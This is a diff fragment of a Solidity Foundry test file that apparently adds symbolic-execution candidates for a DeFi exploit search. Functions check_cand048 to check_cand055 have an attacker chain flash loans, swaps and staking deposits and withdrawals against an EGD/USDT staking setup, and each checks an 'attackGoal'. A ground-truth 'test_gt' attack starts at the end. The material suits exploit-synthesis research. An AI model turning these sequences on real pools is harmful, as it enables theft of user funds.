+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        deposit_egdstaking_usdt_egdslp(amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand048(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        deposit_egdstaking_usdt_egdslp(amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand049(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_usdt_egd(amt4, amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        deposit_egdstaking_usdt_egdslp(amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand050(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        deposit_egdstaking_usdt_egdslp(amt8);
+        withdraw_egdstaking_egdslp_egd(amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand051(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt10 >= amt8);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        borrow_usdt_pair(amt8);
+        withdraw_egdstaking_egdslp_egd(amt9);
+        payback_usdt_pair(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand052(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt10 >= amt8);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        borrow_egd_pair(amt8);
+        withdraw_egdstaking_egdslp_egd(amt9);
+        payback_egd_pair(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand053(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand054(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        swap_pair_attacker_usdt_egd(amt8, amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand055(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_usdt_egd(amt9, amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_usdt_owner(2100e18);
